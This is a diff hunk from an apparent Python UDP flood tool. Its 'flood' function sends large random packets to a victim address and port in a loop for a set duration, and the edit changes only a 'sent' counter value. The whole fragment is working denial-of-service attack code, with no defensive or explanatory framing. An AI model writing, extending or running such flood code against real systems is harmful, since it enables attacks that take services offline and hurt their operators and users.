@@ -12,7 +12,7 @@ def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(29009)
     timeout =  time.time() + duration
-    sent = 499999
+    sent = 99999
 
     while time.time() < timeout:
         client.sendto(bytes, (victim, vport))
